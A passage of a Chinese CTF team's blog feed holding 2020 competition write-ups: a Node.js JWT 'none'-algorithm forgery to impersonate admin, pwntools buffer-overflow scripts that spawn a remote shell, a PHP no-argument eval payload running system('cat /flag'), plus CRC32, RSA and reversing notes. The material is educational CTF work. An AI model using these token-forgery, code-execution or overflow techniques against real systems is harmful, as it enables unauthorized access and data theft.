class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'GET /api/flag'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(ctx.session.username !== <span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'permission error'</span>, <span class="string">'permission denied'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.readFileSync(<span class="string">'/flag'</span>).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'GET /api/logout'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = <span class="literal">null</span>;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这儿的大致意思就是注册登录，并把信息保存在<code>jwt</code>中，一般jwt是可以伪造的，但是这儿密码我们根本不可能爆破出来</p><p>所以只能寻求其它的方法，我们注意到，我们每一次登录，都会生成密匙并插入到列表当中，然后登录的时候根据<code>sid</code>来选择对应的密匙<br>值得注意的是，我们这儿的sid可控，假如我们令<code>sid=0.1</code>会怎么样呢？<br>这个就是<code>node</code>的<code>jwt</code>漏洞<br>当<code>jwt secret</code>为空时 <code>jsonwebtoken</code>会采用<code>algorithm none</code>进行解密 </p><br><br><h5 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h5><p>登录的时候会返回<code>sses:aok</code>，里面包含我们的登录信息，这个我们可以更改（改登录名）</p><p><img src="https://img-blog.csdnimg.cn/20200419193921882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我们先解密一下注册时返回的jwt<br><a href="https://www.jsonwebtoken.io/" target="_blank" rel="noopener">链接</a></p><p><img src="https://img-blog.csdnimg.cn/20200419194154665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><p>然后我们进行伪造jwt</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(&#123;<span class="string">"secretid"</span>:<span class="number">0.1</span>,<span class="string">"username"</span>: <span class="string">"admin"</span>,<span class="string">"password"</span>: <span class="string">"xxx"</span>,<span class="string">"iat"</span>: <span class="number">1587287370</span>&#125;,algorithm=<span class="string">"none"</span>,key=<span class="string">""</span>).decode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure><p>  <img src="https://img-blog.csdnimg.cn/20200419194326392.png" alt="在这里插入图片描述"><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6MC4xLCJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJ4eHgiLCJpYXQiOjE1ODcyODczNzB9.</code></p><p>  <img src="https://img-blog.csdnimg.cn/20200419194530451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>  用户名，密码，jwt必须相对应<br>然后记住返回的页面中的<code>sses:aok</code>和<code>sses:aok.sig</code></p></li></ul><p>​    </p><ul><li>进入flag页面<br><img src="https://img-blog.csdnimg.cn/20200419194700353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这两个值都进行替换（登录页面返回的值），就能得到<code>flag</code></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;先扫一下目录&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="JS" scheme="https://boiteam.github.io/categories/Web/JS/"/>
    
    
      <category term="Web_JWT" scheme="https://boiteam.github.io/tags/Web-JWT/"/>
    
  </entry>
  
  <entry>
    <title>2020 虎符CTF Count</title>
    <link href="https://boiteam.github.io/2020/04/19/2020%20%E8%99%8E%E7%AC%A6CTF%20Count/"/>
    <id>https://boiteam.github.io/2020/04/19/2020%20%E8%99%8E%E7%AC%A6CTF%20Count/</id>
    <published>2020-04-19T01:52:20.000Z</published>
    <updated>2020-04-20T13:41:28.940Z</updated>
    
    <content type="html"><![CDATA[<p>200次计算求值，结束直接给覆盖点然后启的SHELL</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment">#nc 39.97.210.182 40285</span></span><br><span class="line">p = remote(<span class="string">'39.97.210.182'</span>,<span class="number">40285</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span><span class="params">()</span>:</span></span><br><span class="line">bstr = p.recvuntil(<span class="string">'Math: '</span>)</span><br><span class="line">mathstr = p.recvuntil(<span class="string">'='</span>,drop=<span class="literal">True</span>)</span><br><span class="line">result = eval(mathstr)</span><br><span class="line">p.sendline(str(result))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">count()</span><br><span class="line">print(i)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'a'</span>*(<span class="number">0x88</span><span class="number">-0x24</span>)+p64(<span class="number">0x12235612</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#39.97.210.182 40285</span></span><br><span class="line">p=remote(<span class="string">'39.97.210.182'</span>,<span class="number">40285</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">()</span>:</span></span><br><span class="line"> p.recvuntil(<span class="string">'Math: '</span>)</span><br><span class="line"> a=int(p.recv(<span class="number">2</span>))</span><br><span class="line"> p.recvuntil(<span class="string">'* '</span>)</span><br><span class="line"> b=int(p.recv(<span class="number">2</span>))</span><br><span class="line"> p.recvuntil(<span class="string">'+ '</span>)</span><br><span class="line"> c=int(p.recv(<span class="number">2</span>))</span><br><span class="line"> p.recvuntil(<span class="string">'+ '</span>)</span><br><span class="line"> d=int(p.recv(<span class="number">2</span>))</span><br><span class="line"> e=a*b+c+d</span><br><span class="line"> p.sendline(str(e))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line"> fun()</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">100</span>+p32(<span class="number">0x12235612</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;200次计算求值，结束直接给覆盖点然后启的SHELL&lt;/p&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://boiteam.github.io/categories/Pwn/"/>
    
      <category term="Stack" scheme="https://boiteam.github.io/categories/Pwn/Stack/"/>
    
    
      <category term="Pwn_Stack" scheme="https://boiteam.github.io/tags/Pwn-Stack/"/>
    
  </entry>
  
  <entry>
    <title>2020 虎符网络安全大赛   game</title>
    <link href="https://boiteam.github.io/2020/04/19/game-wp/"/>
    <id>https://boiteam.github.io/2020/04/19/game-wp/</id>
    <published>2020-04-19T01:52:20.000Z</published>
    <updated>2020-04-21T00:12:32.480Z</updated>
    
    <content type="html"><![CDATA[<p>题目直接给了将pyc文件反编译的字节码，第一次接触看着有点恶心，但对着python官方文档的disam模块翻译就是了,要求输入长度为39</p><p>加密过程十分简单，将input分成四块加密分别是：<br>(用python的切片格式表示)<br>1、input[0,5]<br>2、input[6:30:3]<br>3、input[28:34]<br>4、input[-2:34:-1]<br>第一部分就是((((input[0]<em>128+input[1])</em>128+input[2])<em>128+input[3])</em>128+input[4])<em>128+input[5]==3533889469877(但不之怎爆破不出来，后面是猜前5个为flag{)<br>第二部分就是(input</em>17684+372511)%257==arr0[i]<br>第三部分就是(input+107)/16+77==arr2[i]&amp;&amp;(input+117)%16+99==arr2[i+1]<br>第四部分是作为密钥与input[7:27]异或最后判断是否等于arr1</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目直接给了将pyc文件反编译的字节码，第一次接触看着有点恶心，但对着python官方文档的disam模块翻译就是了,要求输入长度为39&lt;/p&gt;
    
    </summary>
    
    
      <category term="Re" scheme="https://boiteam.github.io/categories/Re/"/>
    
    
      <category term="python reversing" scheme="https://boiteam.github.io/tags/python-reversing/"/>
    
  </entry>
  
  <entry>
    <title>2020 虎符网络安全大赛 GM</title>
    <link href="https://boiteam.github.io/2020/04/19/%E8%99%8E%E7%AC%A6cry.assets/"/>
    <id>https://boiteam.github.io/2020/04/19/%E8%99%8E%E7%AC%A6cry.assets/</id>
    <published>2020-04-18T16:00:00.000Z</published>
    <updated>2020-04-20T14:36:11.152Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-GM"><a href="#0x01-GM" class="headerlink" title="0x01 GM"></a>0x01 GM</h2><p>考点为Goldwasser–Micali密码系统</p><p>flag通过该系统对每一位进行加密，算法如下</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6cry.assets/0.png" alt="img"></p><p>通过题目中条件给的N与phi可求出p、q</p><p>再将c中的每一个密文对p和q分别求雅可比符号，当两者的雅可比符号为1时，则该位数上的值为0；当两者的雅可比符号为-1时，则该位数上的值为1</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6cry.assets/0-1587312863774.png" alt="img"></p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6cry.assets/0-1587312871707.png" alt="img"></p><p>主要代码如下</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6cry.assets/0-1587312885815.png" alt="img"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-GM&quot;&gt;&lt;a href=&quot;#0x01-GM&quot; class=&quot;headerlink&quot; title=&quot;0x01 GM&quot;&gt;&lt;/a&gt;0x01 GM&lt;/h2&gt;
    
    </summary>
    
    
      <category term="Crypto" scheme="https://boiteam.github.io/categories/Crypto/"/>
    
    
      <category term="Goldwasser–Micali密码系统" scheme="https://boiteam.github.io/tags/Goldwasser%E2%80%93Micali%E5%AF%86%E7%A0%81%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="CRC32" scheme="https://boiteam.github.io/tags/CRC32/"/>
    
  </entry>
  
  <entry>
    <title>2020 易林博“停课不停赛，以赛促学” CRC32</title>
    <link href="https://boiteam.github.io/2020/03/29/CRC32/"/>
    <id>https://boiteam.github.io/2020/03/29/CRC32/</id>
    <published>2020-03-28T16:00:00.000Z</published>
    <updated>2020-03-30T02:38:04.928Z</updated>
    
    <content type="html"><![CDATA[<p>正常的通过CRC校验码爆破密码，打开压缩包发现每个密码文件都是四字节，改一改脚本依次爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic=string.printable</span><br><span class="line">crc = <span class="number">0x5194c2d0</span>  <span class="comment"># 记得要以0x开头</span></span><br><span class="line"><span class="keyword">print</span> <span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic :</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                s=str(i)+str(j)+str(p)+str(q)</span><br><span class="line">                <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                    print(s)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;正常的通过CRC校验码爆破密码，打开压缩包发现每个密码文件都是四字节，改一改脚本依次爆破&lt;/p&gt;
    
    </summary>
    
    
      <category term="Crypto" scheme="https://boiteam.github.io/categories/Crypto/"/>
    
    
      <category term="Crypto_CRC32" scheme="https://boiteam.github.io/tags/Crypto-CRC32/"/>
    
  </entry>
  
  <entry>
    <title>2020 易林博“停课不停赛，以赛促学” RCE_NOPAR</title>
    <link href="https://boiteam.github.io/2020/03/29/RCE_NOPAR/"/>
    <id>https://boiteam.github.io/2020/03/29/RCE_NOPAR/</id>
    <published>2020-03-28T16:00:00.000Z</published>
    <updated>2020-03-29T08:17:16.976Z</updated>
    
    <content type="html"><![CDATA[<p>无字符GETSHELL就行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>]))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'var'</span>])) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">if</span> (!preg_match(<span class="string">'/et|dir|na|info|dec|oct|pi|log/i'</span>, $_GET[<span class="string">'var'</span>])) &#123;</span></span><br><span class="line"><span class="php">                    <span class="keyword">eval</span>($_GET[<span class="string">'var'</span>]);</span></span><br><span class="line"><span class="php">                &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">"Sorry!"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>payload：eval(hex2bin(session_id(session_start())))</p><p>改PHPSSEION值为16进制就行</p><p>system(‘cat /flag’);     -&gt;      73797374656d2827636174202f666c616727293b</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无字符GETSHELL就行&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="php" scheme="https://boiteam.github.io/categories/Web/php/"/>
    
    
      <category term="Web_无字符Getshell" scheme="https://boiteam.github.io/tags/Web-%E6%97%A0%E5%AD%97%E7%AC%A6Getshell/"/>
    
  </entry>
  
  <entry>
    <title>2020 易林博“停课不停赛，以赛促学” re1</title>
    <link href="https://boiteam.github.io/2020/03/29/Re1/"/>
    <id>https://boiteam.github.io/2020/03/29/Re1/</id>
    <published>2020-03-28T16:00:00.000Z</published>
    <updated>2020-03-29T08:07:58.080Z</updated>
    
    <content type="html"><![CDATA[<p>签到题，先运行下程序，发现有文字提示“输入flag”。<br>用IDA打开程序，搜索字符flag，找到程序关键函数sub_140001070()。<br>找到判断逻辑，读取输入直接与flag对比。直接将代码if判断条件中的字符串提取出即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;签到题，先运行下程序，发现有文字提示“输入flag”。&lt;br&gt;用IDA打开程序，搜索字符flag，找到程序关键函数sub_140001070()。&lt;br&gt;找到判断逻辑，读取输入直接与flag对比。直接将代码if判断条件中的字符串提取出即可。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Re" scheme="https://boiteam.github.io/categories/Re/"/>
    
    
      <category term="Re_算法求解" scheme="https://boiteam.github.io/tags/Re-%E7%AE%97%E6%B3%95%E6%B1%82%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>2020 易林博“停课不停赛，以赛促学” EasyRsa</title>
    <link href="https://boiteam.github.io/2020/03/29/EasyRsa/"/>
    <id>https://boiteam.github.io/2020/03/29/EasyRsa/</id>
    <published>2020-03-28T16:00:00.000Z</published>
    <updated>2020-03-30T02:50:49.846Z</updated>
    
    <content type="html"><![CDATA[<p>热身题，直接给了私钥，但是有一些迷惑性的信息</p><p><img src="/2020/03/29/EasyRsa/image-20200330100636601.png" alt="image-20200330100636601"></p><p>2两个1024bit，5个512bit，用俩大数模小数，得到的值是0的即为p,q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pmq <span class="keyword">import</span> *</span><br><span class="line">x1=int(<span class="string">'''00 E5 27 56 BF EB</span></span><br><span class="line"><span class="string">DA 06 F1 E7 C5 7C 4C 27  87 60 8F E7 1E C1 1F DE</span></span><br><span class="line"><span class="string">1B BF 7A 4A 0C A7 82 46  36 5D 03 AE 68 EB 87 97</span></span><br><span class="line"><span class="string">8A 33 61 DD 0F D9 F3 07  BF 35 52 CB 4D A7 83 B8</span></span><br><span class="line"><span class="string">3F 06 BF CE ED 62 7E 35  4C C7 41 AD A1 C8 F6 4C</span></span><br><span class="line"><span class="string">44 3F DD 01 44 F8 F2 C2  F4 C3 85 1F 1F 96 B8 89</span></span><br><span class="line"><span class="string">7D 04 B7 2A 1C 39 FC 34  2E B2 87 E9 D4 84 1D 30</span></span><br><span class="line"><span class="string">99 F6 45 96 DF 4A DF B1  84 B5 11 87 8B 3F 0C 4C</span></span><br><span class="line"><span class="string">94 2C A9 92 0F FB 7F 99  47 1E 05'''</span>.replace(<span class="string">' '</span>,<span class="string">''</span>).replace(<span class="string">'\n'</span>,<span class="string">''</span>),<span class="number">16</span>)</span><br><span class="line">x3=int(<span class="string">'''00 F7 27  15 97 1B 35 84 F9 40 0D</span></span><br><span class="line"><span class="string">95 61 B9 62 D2 39 09 D9  8F 74 F5 38 4C AF C1 96</span></span><br><span class="line"><span class="string">79 38 20 8D B6 6A C8 04  9F 27 93 09 D3 7A 31 56</span></span><br><span class="line"><span class="string">74 27 A8 46 4D B4 CD D1  60 14 B6 08 0D 5F 72 F7</span></span><br><span class="line"><span class="string">75 60 F7 F7 97 47'''</span>.replace(<span class="string">' '</span>,<span class="string">''</span>).replace(<span class="string">'\n'</span>,<span class="string">''</span>),<span class="number">16</span>)</span><br><span class="line">x4=int(<span class="string">'''00 ED 5B 4F 9E C8 14 02</span></span><br><span class="line"><span class="string">51 58 42 0D 73 34 07 89  B2 1E 85 C0 09 AA BD 04</span></span><br><span class="line"><span class="string">EE 4F 37 E1 EC 6C B7 8B  37 AF D7 30 42 4C 53 BA</span></span><br><span class="line"><span class="string">8C 16 75 14 EC 0E C9 7D  FD 77 C6 CD 09 6E 56 49</span></span><br><span class="line"><span class="string">55 4E 7B 68 5F E6 63 5E  53'''</span>.replace(<span class="string">' '</span>,<span class="string">''</span>).replace(<span class="string">'\n'</span>,<span class="string">''</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=x3</span><br><span class="line">q=x4</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=int(open(<span class="string">r'C:\Users\Administrator\Desktop\EasyRSA\flag.en'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(M(e,p,q,c))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'666c61677b57653163306d6543746633725f656c61627d0a'</span>.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;热身题，直接给了私钥，但是有一些迷惑性的信息&lt;/p&gt;
    
    </summary>
    
    
      <category term="Crypto" scheme="https://boiteam.github.io/categories/Crypto/"/>
    
    
      <category term="Crypto_RSA算法原理" scheme="https://boiteam.github.io/tags/Crypto-RSA%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
</feed>
